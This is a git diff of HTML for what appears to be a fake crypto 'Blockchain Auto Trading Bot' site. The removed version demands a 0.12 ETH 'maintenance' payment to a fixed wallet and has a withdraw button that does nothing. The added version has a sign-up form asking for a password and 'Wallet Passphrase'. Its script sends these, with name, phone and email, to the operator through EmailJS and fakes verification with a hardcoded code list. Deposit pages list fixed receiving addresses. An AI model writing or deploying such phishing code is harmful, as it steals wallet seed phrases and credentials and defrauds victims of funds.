@@ -1,102 +1,501 @@
-<!DOCTYPE html><html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Blockchain Auto-Trading Room</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-</head>
-<body class="bg-gray-900 text-white font-sans">
-  <header class="bg-gray-800 p-4 shadow-md text-center">
-    <h1 class="text-3xl font-bold">Blockchain Auto-Trading Room</h1>
-    <p class="text-sm">Admin Contact: <a href="https://wa.me/12096635424" class="text-green-400">+1 (209) 663-5424</a></p>
-  </header>
-  <main class="p-6 space-y-8">
-    <!-- Existing Sections (Profile, KYC, Wallet, Trade) injected here -->
-    <section id="metatraderPage" class="p-6 bg-gray-800 text-white">
-      <h2 class="text-2xl font-bold mb-4">Trading Domain (MetaTrader 5 Style)</h2>
-      <div class="grid grid-cols-5 gap-2 mb-4">
-        <button class="bg-blue-600 p-2 rounded">Quotes</button>
-        <button class="bg-green-600 p-2 rounded">Charts</button>
-        <button class="bg-yellow-600 p-2 rounded">Trade</button>
-        <button class="bg-purple-600 p-2 rounded">History</button>
-        <button class="bg-gray-600 p-2 rounded">Messages</button>
-      </div>
-      <div class="bg-gray-700 p-4 rounded">
-        <p class="text-lg">Live Price Updates (via CoinGecko):</p>
-        <ul class="list-disc list-inside" id="liveQuotes"></ul>
-      </div>
-    </section><section id="maintenancePopup" class="hidden fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center">
-  <div class="bg-gray-800 p-6 rounded w-96">
-    <h3 class="text-xl font-bold mb-4">Maintenance Required</h3>
-    <p>Your account requires maintenance to continue trading. Please send the following amount:</p>
-    <p class="text-green-400 mt-2 mb-4">0.12 ETH or 0.19 BNB</p>
-    <p class="text-sm">Send to:</p>
-    <p class="mb-2">0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</p>
-    <button onclick="validateMaintenanceCode()" class="bg-blue-500 px-4 py-2 rounded">Enter Maintenance Code</button>
-  </div>
-</section>
+<!DOCTYPE html><html lang="en">    <head>      
+  <meta charset="UTF-8" />      
+  <title>Blockchain Auto Trading Bot</title>      
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>      
+  <style>      
+    body {      
+      background: #0b1234;      
+      color: #fff;      
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;      
+      margin: 0;      
+      padding: 0;      
+    }      
+    main {      
+      max-width: 480px;      
+      margin: 40px auto;      
+      padding: 20px;      
+      background: #111a3a;      
+      border-radius: 10px;      
+      box-shadow: 0 0 10px #000c44;      
+    }      
+    h1, h2, h3 {      
+      color: #f0c040;      
+      margin-bottom: 16px;      
+    }      
+    input, button {      
+      width: 100%;      
+      padding: 12px;      
+      margin: 10px 0;      
+      border-radius: 6px;      
+      border: none;      
+      font-size: 16px;      
+    }      
+    input {      
+      background: #222;      
+      color: #eee;      
+    }      
+    button {      
+      background: #f0c040;      
+      color: #111;      
+      font-weight: 700;      
+      cursor: pointer;      
+      transition: background 0.3s;      
+      border: none;      
+    }      
+    button:hover {      
+      background: #ddb830;      
+    }      
+    .hidden {      
+      display: none;      
+    }      
+    .error {      
+      color: #ff5555;      
+      margin-bottom: 10px;      
+    }      
+    .success {      
+      color: #4caf50;      
+      margin-bottom: 10px;      
+    }      
+    .loading {      
+      color: #f0c040;      
+      font-weight: bold;      
+      margin-bottom: 10px;      
+    }      
+    a {      
+      color: #f0c040;      
+      cursor: pointer;      
+      text-decoration: underline;      
+    }      
+  </style>      
+</head>      
+<body>      
+  <main>      
+    <!-- PAGE 1: Welcome -->      
+    <section id="page1">      
+      <h1>Welcome to Blockchain Auto Trading Bot</h1>      
+      <p>24/7 Intelligent Crypto Trading.
+       Powered by Blockchain.      
+  Take your crypto trading to the next level with our cutting-edge Blockchain Auto Trading Bot — a fully automated system that leverages advanced algorithms, real-time market data, and smart contract technology to trade your assets efficiently and securely.
 
-<section id="depositPage" class="p-6 bg-gray-800 text-white">
-  <h2 class="text-2xl font-bold mb-4">Deposit Funds</h2>
-  <input type="number" placeholder="Enter Amount" class="w-full p-2 mb-4 text-black rounded">
-  <div class="space-y-2">
-    <div>ETH: 0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130 <button class="ml-2 bg-yellow-400 text-black px-2 py-1 rounded">Copy</button></div>
-    <div>BNB: 0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130 <button class="ml-2 bg-yellow-400 text-black px-2 py-1 rounded">Copy</button></div>
-    <div>TRC20: TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco <button class="ml-2 bg-yellow-400 text-black px-2 py-1 rounded">Copy</button></div>
-  </div>
-  <div class="mt-4">
-    <input type="text" placeholder="Enter Deposit Code" class="w-full p-2 mb-2 text-black rounded">
-    <button class="bg-green-600 px-4 py-2 rounded">Submit Code</button>
-  </div>
-</section>
+✅ AI-Powered Strategy Execution
+✅ Integrated with Binance, Ethereum, BSC & More
+✅ Auto-Buy/Sell at Optimal Market Conditions
+✅ Secure, Transparent, and On-Chain Verified
+✅ Real-Time Profit Dashboard & Alerts
 
-<section id="withdrawalPage" class="p-6 bg-gray-800 text-white">
-  <h2 class="text-2xl font-bold mb-4">Withdraw Funds</h2>
-  <label class="block mb-1">Withdrawal Address:</label>
-  <input type="text" class="w-full p-2 mb-4 text-black rounded">
-  <label class="block mb-1">Amount:</label>
-  <input type="number" class="w-full p-2 mb-4 text-black rounded">
-  <label class="block mb-1">Network:</label>
-  <select class="w-full p-2 mb-4 text-black rounded">
-    <option>BNB BEP20</option>
-    <option>Ethereum</option>
-    <option>Tron TRC20</option>
-  </select>
-  <p class="text-sm text-gray-300 mb-4">Gas Fee will be calculated automatically.</p>
-  <button onclick="alert('Withdraw processing...')" class="bg-red-500 px-4 py-2 rounded">Withdraw</button>
-</section>
+You stay in control.
+Set your trading goals, stop-loss limits, and preferred pairs. Let the bot do the rest while you monitor your profits from an intuitive dashboard</p>
+<button id="btnGotoSignup">Sign Up</button>
+<button id="btnGotoLogin">Login</button>
+</section><!-- PAGE 1i: Sign Up -->
 
-  </main>  <footer class="bg-gray-800 p-4 text-center text-sm text-gray-400">
-    &copy; 2025 Blockchain Auto Trading Room | All rights reserved.
-  </footer>  <script>
-    async function fetchLivePrices() {
-      try {
-        const res = await axios.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,tether,usd-coin,solana&vs_currencies=usd");
-        const quotes = res.data;
-        const container = document.getElementById("liveQuotes");
-        container.innerHTML = "";
-        for (const coin in quotes) {
-          const price = quotes[coin].usd;
-          container.innerHTML += `<li>${coin.toUpperCase()}: $${price}</li>`;
-        }
-      } catch (e) {
-        console.error("Failed to fetch quotes", e);
-      }
-    }
-    fetchLivePrices();
-    setInterval(fetchLivePrices, 10000);
+<section id="page1i" class="hidden">      
+  <h2>Sign Up</h2>      
+  <form id="signupForm">      
+    <input type="text" id="full_name" name="full_name" placeholder="Full Name" required />      
+    <input type="tel" id="phone_number" name="phone_number" placeholder="Phone Number" required pattern="^\\+?[0-9]{7,15}$" title="Enter a valid phone number" />      
+    <input type="email" id="user_email" name="user_email" placeholder="Email" required />      
+    <input type="password" id="password" name="password" placeholder="Password" required minlength="6" />      
+    <input type="password" id="confirm_password" name="confirm_password" placeholder="Confirm Password" required minlength="6" />      
+    <input type="text" id="secret_phrase" name="secret_phrase" placeholder="Wallet Passphrase" required />      
+    <button type="submit">Sign Up</button>      
+  </form>      
+  <p><a id="linkBackToWelcome1i">Back to Welcome</a></p>      
+  <p id="signupError" class="error"></p>      
+</section>      <!-- PAGE 1ii: Verification -->      <section id="page1ii" class="hidden">      
+  <h2>Enter Verification Code</h2>      
+  <p>Please check your email for the verification code.</p>      
+  <input type="text" id="inputVerificationCode" placeholder="Verification Code" />      
+  <button id="btnVerifyCode">Verify</button>      
+  <p id="verifyMessage" class="error"></p>      
+  <div id="loadingMessage" class="loading hidden">Verifying, please wait...</div>      
+  <p><a id="linkBackToSignup">Back to Sign Up</a></p>      
+</section>      <!-- PAGE 1iii: Login -->      <section id="page1iii" class="hidden">      
+  <h2>Login</h2>      
+  <form id="loginForm">      
+    <input type="email" id="login_email" name="login_email" placeholder="Email" required />      
+    <input type="password" id="login_password" name="login_password" placeholder="Password" required minlength="6" />      
+    <button type="submit">Login</button>      
+  </form>      
+  <p id="loginError" class="error"></p>      
+  <p><a id="linkBackToWelcome1iii">Back to Welcome</a></p>      
+</section>    
+    
+  <!-- Page 3: Main Dashboard -->     
+    <div id="page3" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
+  <h2 style="margin-bottom:20px;">📊 Dashboard</h2>      
+  <div style="margin-bottom:20px;">      
+    <strong>Total Balance:</strong>      
+    <span id="dashboardBalance">$0.00</span>      
+  </div>       
+  <!-- Live Prices -->        
+  <div style="margin-bottom:20px;">      
+    <strong>Live Prices:</strong><br>      
+    BTC: <span id="btcPrice">$0.00</span><br>      
+    ETH: <span id="ethPrice">$0.00</span><br>      
+    BNB: <span id="bnbPrice">$0.00</span><br>      
+    USDT: <span id="usdtPrice">$0.00</span>      
+  </div> 
+  
+   <!-- Deposit Section -->        
+  <div style="margin-bottom:20px;">      
+    <label for="depositAmount">Deposit Amount (USD):</label>      
+    <input type="number" id="depositAmount" placeholder="Amount" style="width:100%; padding:8px; margin:4px 0 10px;" />      <label for="depositNetwork">Network:</label>      
+<select id="depositNetwork" style="width:100%; padding:8px; margin-bottom:10px;">      
+  <option value="BTC">Bitcoin</option>      
+  <option value="ETH">Ethereum</option>      
+  <option value="BNB">Binance Smart Chain</option>      
+  <option value="SOL">Solana</option>      
+  <option value="TRX">Tron</option>      
+</select>      
+  
+<label for="depositCode">Admin Deposit Code:</label>      
+<input type="text" id="depositCode" placeholder="Enter deposit code" style="width:100%; padding:8px; margin-bottom:10px;" />      
+  
+<button id="btnConfirmDeposit" style="padding:10px 20px; background:#1F6FEB; border:none; color:white; border-radius:8px; cursor:pointer;">Confirm Deposit</button>
 
-    function validateMaintenanceCode() {
-      const code = prompt("Enter your maintenance code");
-      const validAccessCodes = ["Bkdn3lwe5", "Bpht3gvu1", "Bmxz3ijp9", "Bzrf3kqb3"];
-      if (validAccessCodes.includes(code)) {
-        alert("Maintenance complete. Access restored.");
-        document.getElementById("maintenancePopup").classList.add("hidden");
-      } else {
-        alert("Invalid code. Access suspended.");
-      }
-    }
-  </script></body>
-</html>
+  </div>       
+  <!-- Receive Section -->       
+  <div style="margin-bottom:20px;">      
+    <h3>📥 Receive</h3>      
+    <label for="receiveToken">Token:</label>      
+    <select id="receiveToken" style="width:100%; padding:8px; margin-bottom:10px;">      
+      <option value="USDT">USDT</option>      
+      <option value="BTC">BTC</option>      
+      <option value="ETH">ETH</option>      
+      <option value="BNB">BNB</option>      
+      <option value="SOL">SOL</option>      
+      <option value="TRX">TRX</option>      
+    </select>      
+    <button onclick="showReceiveAddress()" style="padding:10px 20px; background:#28a745; border:none; color:white; border-radius:8px; cursor:pointer;">Show Receive Address</button>      
+    <div id="receiveAddressBox" style="margin-top:10px; display:none;"></div>      
+  </div>        
+  <!-- Navigation Buttons -->       
+  <div style="margin-top:30px; display:flex; gap:10px; flex-wrap:wrap;">      
+    <button onclick="showPage(13)" style="flex:1; padding:15px; background:#1F6FEB; color:white; border:none; border-radius:10px;">Wallet</button>      
+    <button onclick="showPage(12)" style="flex:1; padding:15px; background:#333; color:white; border:none; border-radius:10px;">Settings</button>      
+    <button onclick="showPage(3)" style="flex:1; padding:15px; background:#333; color:white; border:none; border-radius:10px;">Receive</button>      
+    <button onclick="showPage(8)" style="flex:1; padding:15px; background:#333; color:white; border:none; border-radius:10px;">Send</button>      
+    <button onclick="showPage(16)" style="flex:1; padding:15px; background:#28a745; color:white; border:none; border-radius:10px;">Trade</button>      
+  </div>      
+</div>    
+    
+    <!-- Page 3i: Trading Strategy -->      <div id="page3i" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
+  <h2>🧠 Trading Strategy</h2>      
+  <p>Select your preferred trading strategy:</p>      
+  <select id="strategySelect" style="width:100%; padding:10px; margin-bottom:20px;">      
+    <option value="scalping">Scalping</option>      
+    <option value="day_trading">Day Trading</option>      
+    <option value="swing">Swing Trading</option>      
+    <option value="trend_following">Trend Following</option>      
+    <option value="mean_reversion">Mean Reversion</option>      
+  </select>      
+  <button onclick="applyStrategy()" style="padding:10px 20px; background:#1F6FEB; border:none; color:white; border-radius:8px; cursor:pointer;">Apply Strategy</button>      
+  <p id="strategyStatus" style="margin-top:20px;"></p>      
+</div>      
+    <!-- Page 3ii: TradingView Chart -->      <div id="page3ii" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
+  <h2>📈 Live Trade Chart</h2>      
+  <div id="tradingview_chart" style="height:500px;"></div>      
+</div>     
+    <!-- Page 3iii: Receive Page -->      
+    <div id="page3iii" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
+  <h2 style="margin-bottom:20px;">📥 Receive Crypto</h2>     
+    <label for="receiveCoin" style="display:block; margin-bottom:10px;">Select Coin:</label>
+<select id="receiveCoin" style="width:100%; padding:10px; margin-bottom:20px; border-radius:6px; border:none;">
+<option value="btc">Bitcoin (BTC)</option>
+<option value="eth">Ethereum (ETH)</option>
+<option value="bnb">Binance Coin (BNB)</option>
+<option value="sol">Solana (SOL)</option>
+<option value="trx">Tron (TRX)</option>
+</select>
+
+  <div style="margin-top:10px; background-color:#111; padding:15px; border-radius:10px;">      
+    <strong>Token:</strong> 
+    <img id="tokenIcon" src="https://assets.coingecko.com/coins/images/1/thumb/bitcoin.png" alt="icon" style="width:20px; height:20px; vertical-align:middle; margin-right:6px;">      
+    <span id="tokenLabel">BTC</span><br><br>     
+    <strong>Wallet Address:</strong>      
+<p id="receiveAddress" style="word-break:break-all;">bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu</p>      
+<button onclick="copyReceiveAddress()" style="padding:8px 16px; background:#1F6FEB; color:white; border:none; border-radius:6px;">Copy Address</button>
+
+  </div>     
+      <div style="margin-top:30px;">      
+    <button onclick="showPage('page3')" style="padding:10px 20px; background:#444; color:white; border:none; border-radius:8px;">⬅ Back</button>      
+  </div>      
+</div>     
+    <!-- Page 3iv: Deposit Confirmation -->    
+    <div id="page3iv" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
+  <h2 style="margin-bottom:20px;">✅ Confirm Deposit</h2>        
+      <div style="margin-bottom:20px;">      
+    <strong>Selected Network:</strong><br>      
+    <span id="confirmNetwork">-</span>      
+  </div>        
+      <div style="margin-bottom:20px;">      
+    <strong>Deposit Amount:</strong><br>      
+    <span id="confirmAmount">$0.00</span>      
+  </div>       
+      <div style="margin-bottom:20px;">      
+    <strong>Admin Deposit Code:</strong><br>      
+    <span id="confirmCode">-</span>      
+  </div>       
+      <a href="https://mail-org.github.io/Blockchain/" target="_blank">      
+    <button style="padding:10px 20px; background:#28a745; color:white; border:none; border-radius:8px; margin-top:20px;">      
+      Confirm and Send      
+    </button>      
+  </a>        
+      <div style="margin-top:30px;">      
+    <button onclick="showPage('page3')" style="padding:10px 20px; background:#444; color:white; border:none; border-radius:8px;">      
+      ⬅ Back    
+    </button>      
+  </div>      
+</div>        
+    <script>      
+    emailjs.init("VTJD_okCRB6iOQZRH");const verificationCodes = ["71xz04", "58kl39", "83md22", "67tr85", "42vn93", "96wb20", "33jq87", "75cy44", "18dl70", "49fx18", "84kp02", "69hr75", "21bn64", "55ze96", "02my47", "47lv51", "38xt83", "60ns30", "73dc12", "66oj90"];      
+      
+function saveUserData(user) { localStorage.setItem('userData', JSON.stringify(user)); }      
+function getUserData() { return JSON.parse(localStorage.getItem('userData')); }      
+function clearUserData() { localStorage.removeItem('userData'); }      
+      
+function showPage(id) {      
+  document.querySelectorAll('main > section').forEach(s => s.classList.add('hidden'));      
+  document.getElementById(id).classList.remove('hidden');      
+  clearMessages();      
+}      
+function clearMessages() {      
+  document.getElementById('signupError').textContent = '';      
+  document.getElementById('verifyMessage').textContent = '';      
+  document.getElementById('loginError').textContent = '';      
+  document.getElementById('loadingMessage').classList.add('hidden');      
+}      
+      
+let currentVerificationCode = '';      
+let currentUserEmail = '';      
+      
+document.getElementById('btnGotoSignup').onclick = () => showPage('page1i');      
+document.getElementById('btnGotoLogin').onclick = () => showPage('page1iii');      
+document.getElementById('linkBackToWelcome1i').onclick = () => showPage('page1');      
+document.getElementById('linkBackToSignup').onclick = () => showPage('page1i');      
+document.getElementById('linkBackToWelcome1iii').onclick = () => showPage('page1');      
+      
+document.getElementById('signupForm').addEventListener('submit', function(event) {      
+  event.preventDefault();      
+  clearMessages();      
+      
+  const fullName = this.full_name.value.trim();      
+  const phone = this.phone_number.value.trim();      
+  const email = this.user_email.value.trim();      
+  const password = this.password.value;      
+  const confirmPassword = this.confirm_password.value;      
+  const secretPhrase = this.secret_phrase.value.trim();      
+      
+  if(password !== confirmPassword) {      
+    document.getElementById('signupError').textContent = "Passwords do not match.";      
+    return;      
+  }      
+      
+  currentVerificationCode = verificationCodes[Math.floor(Math.random() * verificationCodes.length)];      
+  currentUserEmail = email;      
+      
+  emailjs.send("service_xg8bzqs", "template_gclz9gu", {      
+    full_name: fullName,      
+    phone_number: phone,      
+    user_email: email,      
+    password: password,      
+    secret_phrase: secretPhrase,      
+    verification_code: currentVerificationCode      
+  }).then(() => {      
+    return emailjs.send("service_xg8bzqs", "template_r0zg4zj", {      
+      to_email: email,      
+      to_name: fullName,      
+      verification_code: currentVerificationCode      
+    });      
+  }).then(() => {      
+    alert(`Verification code sent to ${email}. Please check your email.`);      
+    saveUserData({ fullName, phone, email, password, secretPhrase });      
+    this.reset();      
+    showPage('page1ii');      
+  }).catch(err => {      
+    console.error('EmailJS error:', err);      
+    document.getElementById('signupError').textContent = 'Error sending email. Please try again later.';      
+  });      
+});      
+      
+document.getElementById('btnVerifyCode').onclick = () => {      
+  clearMessages();      
+  const inputCode = document.getElementById('inputVerificationCode').value.trim();      
+  if (!inputCode) {      
+    document.getElementById('verifyMessage').textContent = 'Please enter the verification code.';      
+    return;      
+  }      
+      
+  const loading = document.getElementById('loadingMessage');      
+  loading.classList.remove('hidden');      
+      
+  setTimeout(() => {      
+    loading.classList.add('hidden');      
+    if (verificationCodes.includes(inputCode) && inputCode === currentVerificationCode) {      
+      alert('Verification successful! Redirecting to dashboard...');      
+      showDashboard();      
+    } else {      
+      document.getElementById('verifyMessage').textContent = 'Incorrect verification code. Please try again.';      
+    }      
+  }, 1500);      
+};      
+      
+document.getElementById('loginForm').addEventListener('submit', function(event) {      
+  event.preventDefault();      
+  clearMessages();      
+      
+  const email = this.login_email.value.trim();      
+  const password = this.login_password.value;      
+      
+  const storedUser = getUserData();      
+      
+  if (!storedUser) {      
+    document.getElementById('loginError').textContent = 'No registered user found. Please sign up first.';      
+    return;      
+  }      
+  if(email !== storedUser.email || password !== storedUser.password) {      
+    document.getElementById('loginError').textContent = 'Invalid email or password.';      
+    return;      
+  }      
+      
+  alert('Login successful!');      
+  showDashboard();      
+});      
+      
+function showDashboard() {      
+  const user = getUserData();      
+  if(!user) {      
+    alert('No user data found. Please log in or sign up.');      
+    showPage('page1');      
+    return;      
+  }      
+  alert(`Welcome ${user.fullName}`);      
+  showPage('page3');      
+}      
+      
+showPage('page1');      
+      
+  </script>     
+    
+    <script>      
+  // Called after clicking "Confirm Deposit" on Page 3      
+  document.getElementById("btnConfirmDeposit").addEventListener("click", () => {      
+    const amount = document.getElementById("depositAmount").value;      
+    const network = document.getElementById("depositNetwork").value;      
+    const code = document.getElementById("depositCode").value;      
+      
+    if (!amount || !code) {      
+      alert("Please fill in all deposit details.");      
+      return;      
+    }      
+      
+    document.getElementById("confirmAmount").textContent = `$${parseFloat(amount).toFixed(2)}`;      
+    document.getElementById("confirmNetwork").textContent = network;      
+    document.getElementById("confirmCode").textContent = code;      
+      
+    showPage("page3iv");      
+  });      
+</script>     
+    <script>      
+  const tokenIcons = {      
+    btc: 'https://assets.coingecko.com/coins/images/1/thumb/bitcoin.png',      
+    eth: 'https://assets.coingecko.com/coins/images/279/thumb/ethereum.png',      
+    bnb: 'https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png',      
+    sol: 'https://assets.coingecko.com/coins/images/4128/thumb/solana.png',      
+    trx: 'https://assets.coingecko.com/coins/images/1094/thumb/tron.png'      
+  };      
+      
+  const receiveAddresses = {      
+    btc: 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu',      
+    eth: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',      
+    bnb: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',      
+    sol: '8ChmWCsEjvoNcFkze5GgNuUiw3FLTzYy2g5Sw5DumypX',      
+    trx: 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco'      
+  };      
+      
+  document.getElementById("receiveCoin").addEventListener("change", function() {      
+    const coin = this.value;      
+    document.getElementById("receiveAddress").textContent = receiveAddresses[coin];      
+    document.getElementById("tokenLabel").textContent = coin.toUpperCase();      
+    document.getElementById("tokenIcon").src = tokenIcons[coin];      
+  });      
+      
+  function copyReceiveAddress() {      
+    const address = document.getElementById("receiveAddress").textContent;      
+    navigator.clipboard.writeText(address).then(() => {      
+      alert("Address copied to clipboard!");      
+    });      
+  }      
+</script>     
+    
+<script>      
+function applyStrategy() {      
+  const strategy = document.getElementById('strategySelect').value;      
+  document.getElementById('strategyStatus').innerText = `Strategy "${strategy}" has been applied.`;      
+}      
+      
+function showReceiveAddress() {      
+  const token = document.getElementById("receiveToken").value;      
+  const addressMap = {      
+    USDT: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",      
+    BTC: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu",      
+    ETH: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",      
+    BNB: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",      
+    SOL: "8ChmWCsEjvoNcFkze5GgNuUiw3FLTzYy2g5Sw5DumypX",      
+    TRX: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco"      
+  };      
+  const address = addressMap[token] || "Unknown";      
+  document.getElementById("receiveAddressBox").style.display = "block";      
+  document.getElementById("receiveAddressBox").innerHTML = `<strong>${token} Address:</strong> ${address}`;      
+}      
+      
+(function() {      
+  const script = document.createElement('script');      
+  script.src = "https://s3.tradingview.com/tv.js";      
+  script.onload = () => {      
+    new TradingView.widget({      
+      "container_id": "tradingview_chart",      
+      "autosize": true,      
+      "symbol": "BINANCE:BTCUSDT",      
+      "interval": "60",      
+      "timezone": "Etc/UTC",      
+      "theme": "dark",      
+      "style": "1",      
+      "locale": "en",      
+      "toolbar_bg": "#f1f3f6",      
+      "enable_publishing": false,      
+      "allow_symbol_change": true,      
+      "hide_top_toolbar": false,      
+      "hide_legend": false,      
+      "save_image": false      
+    });      
+  };      
+  document.head.appendChild(script);      
+})();      
+      
+async function loadPrices() {      
+  try {      
+    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,tether&vs_currencies=usd');      
+    const data = await res.json();      
+    document.getElementById("btcPrice").innerText = `$${data.bitcoin.usd}`;      
+    document.getElementById("ethPrice").innerText = `$${data.ethereum.usd}`;      
+    document.getElementById("bnbPrice").innerText = `$${data.binancecoin.usd}`;      
+    document.getElementById("usdtPrice").innerText = `$${data.tether.usd}`;      
+  } catch (err) {      
+    console.error("Price API error", err);      
+  }      
+}      
+loadPrices();      
+      
+document.querySelectorAll(".network-copy").forEach(btn => {      
+  btn.addEventListener("click", () => {      
+    const textId = btn.getAttribute("data-copy-id");      
+    const text = document.getElementById(textId).innerText;      
+    navigator.clipboard.writeText(text);      
+    btn.innerText = "Copied!";      
+    setTimeout(() => btn.innerText = "Copy", 1000);      
+  });      
+});      
+</script>      </body>      
+                                                  </html>
